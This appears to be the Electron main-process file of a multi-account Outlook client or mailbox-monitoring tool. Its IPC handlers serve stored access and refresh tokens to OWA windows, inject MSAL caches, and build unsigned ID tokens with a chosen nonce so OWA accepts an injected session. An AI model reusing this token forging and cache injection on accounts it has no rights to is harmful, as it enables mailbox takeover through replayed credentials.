  ipcMain.on('get-owa-tokens', (event, options?: { nonce?: string }) => {
    const accountId = windowToAccountMap.get(event.sender.id);
    if (!accountId) { event.returnValue = null; return; }
    const tokens = outlookTokenStore.get(accountId);
    if (!tokens) { event.returnValue = null; return; }

    let idToken = tokens.idToken;
    if (options?.nonce) {
      const h = Buffer.from(JSON.stringify({ typ: 'JWT', alg: 'RS256', kid: 'dummy' })).toString('base64url');
      const p = Buffer.from(JSON.stringify({
        aud: tokens.clientId, iss: `https://login.microsoftonline.com/${tokens.tid}/v2.0`,
        iat: Math.floor(Date.now() / 1000) - 60, nbf: Math.floor(Date.now() / 1000) - 60,
        exp: Math.floor(Date.now() / 1000) + 3600, nonce: options.nonce,
        name: tokens.name, oid: tokens.oid, preferred_username: tokens.email,
        rh: '0.AAAA...', sub: tokens.oid, tid: tokens.tid, ver: '2.0',
      })).toString('base64url');
      idToken = `${h}.${p}.`;
    }
    const clientInfo = Buffer.from(JSON.stringify({ uid: tokens.oid, utid: tokens.tid })).toString('base64');
    event.returnValue = {
      accessToken: tokens.accessToken, refreshToken: tokens.refreshToken, idToken,
      scope: tokens.scope, expiresIn: tokens.expiresIn, clientInfo, clientId: tokens.clientId,
    };
    dlog('[OWA-Tokens] Served tokens for', tokens.email, 'nonce:', options?.nonce ? 'yes' : 'no');
  });

  // MSAL cache injection for HighHopes-style mailbox loading
  ipcMain.on('get-msal-cache', (event) => {
    const accountId = windowToAccountMap.get(event.sender.id);
    if (!accountId) {
      console.error('[MSAL] No account mapped to window', event.sender.id);
      event.returnValue = {};
      return;
    }
    const cache = msalCacheMap.get(accountId);
    if (!cache) {
      console.error('[MSAL] No cache found for account', accountId);
      event.returnValue = {};
      return;
    }
    dlog('[MSAL] Returning cache for account', accountId, 'entries:', Object.keys(cache).length);
    event.returnValue = cache;
  });

  ipcMain.on('owa-client-id-found', async (event, clientId: string) => {
    dlog('[MAIN] owaClientId intercepted:', clientId);
    appendOutlookDebug(`[MSAL] owa-client-id-found from preload: ${clientId}`);
    const accountId = windowToAccountMap.get(event.sender.id);
    if (accountId) {
      const ok = await regenerateMsalCacheForClientId(accountId, clientId);
      if (ok) {
        appendOutlookDebug(`[MSAL] Cache regenerated from preload IPC for clientId=${clientId}`);
      }
    }
  });

}

// --------------------------
// Window creation
// --------------------------
function createWindow() {
  mainWindow = new BrowserWindow({
    width: 1200,
    height: 800,
    minWidth: 800,
    minHeight: 600,
    titleBarStyle: 'hiddenInset',
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
      preload: path.join(__dirname, 'preload.js'),
      sandbox: false,
    },
    // icon: path.join(__dirname, '../../assets/icon.png')
  });

  // Log renderer process load failures
  mainWindow.webContents.on('did-fail-load', (_event, errorCode, errorDescription) => {
    console.error(`[Main] Failed to load: ${errorCode} ${errorDescription}`);
  });

  // Ensure window is visible
  mainWindow.show();
  mainWindow.center();
  mainWindow.focus();

  // Clean up on close
  mainWindow.on('closed', () => {
    mainWindow = null;
  });

  // Open external links in default browser
  mainWindow.webContents.setWindowOpenHandler(({ url }) => {
    if (url.startsWith('https:') || url.startsWith('http:')) {
      shell.openExternal(url);
      return { action: 'deny' };
    }
    return { action: 'allow' };
  });

  // Load the app
  if (isDev) {
    mainWindow.loadURL('http://localhost:5173');
    mainWindow.webContents.openDevTools();
  } else {
    mainWindow.loadFile(path.join(__dirname, '../../renderer/index.html'));
  }
}

// --------------------------
// App lifecycle
// --------------------------
app.whenReady().then(async () => {
  console.log('[Main] App whenReady starting...');
  try {
    await ensureStateFile();
    console.log('[Main] State file ensured');
    await seedDevAccountFromLocalFile();
    setupIpcHandlers();
    console.log('[Main] IPC handlers setup');
    startTokenRefreshScheduler().catch(err =>
      console.error('[Main] Failed to start token refresh scheduler:', err)
    );

    // Create the shell window immediately so startup doesn't appear frozen
    // while background account/session checks run.
    console.log('[Main] Creating window...');
    createWindow();
    console.log('[Main] Window created');

    // 1. Read saved state
    const state = await readState();
    console.log('[Main] State read:', state.activeView);

    // 2. Run session validity check for all accounts
    console.log('[Main] Running session validity check...');
    checkSessionValidity().catch(err => {
      console.error('[Main] Session validity check failed:', err);
    });

    // 3. Determine if monitoring was paused during downtime
    const now = new Date();
    const lastStateTime = new Date(state.lastState.timestamp);
    const hoursSince = (now.getTime() - lastStateTime.getTime()) / (1000 * 60 * 60);
    if (state.monitoringRunning && hoursSince > 1) {
      dlog(`Monitoring paused for ${hoursSince.toFixed(1)} hours`);
      // Add a single activity-feed entry so the user can see why monitoring
      // is no longer in the running state when they reopen the app.
      try {
        const store = await readStore();
        const feed: any[] = Array.isArray(store.activityFeed) ? store.activityFeed : [];
        feed.unshift({
          id: crypto.randomUUID(),
          type: 'monitoring',
          severity: 'warning',
          message: `Monitoring paused — app was closed for ${hoursSince.toFixed(1)} hours`,
          timestamp: new Date().toISOString(),
        });
        // Cap the feed to a reasonable size so it doesn't grow unbounded.
        store.activityFeed = feed.slice(0, 500);
        await writeStore(store);
      } catch (err) {
        console.warn('[Main] Failed to write monitoring-paused activity entry:', err);
      }
    }

    // 4. Send restored state to renderer (optional - renderer can request via IPC)
    console.log('[Main] App startup complete');
  } catch (error) {
    console.error('[Main] Startup error:', error);
    throw error;
  }

  app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) createWindow();
  });
});

// Stop background timers before quit.
// NOTE: keep this synchronous — Electron does not await async listeners on
// `before-quit`, so any awaited fs work would race process exit. The renderer
// already persists `state.json` on view changes / settings save; the
// `lastState.timestamp` field is purely informational at next launch.
app.on('before-quit', () => {
  stopTokenRefreshScheduler();
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') app.quit();
});

export { checkSessionValidity, startTokenRefreshScheduler };
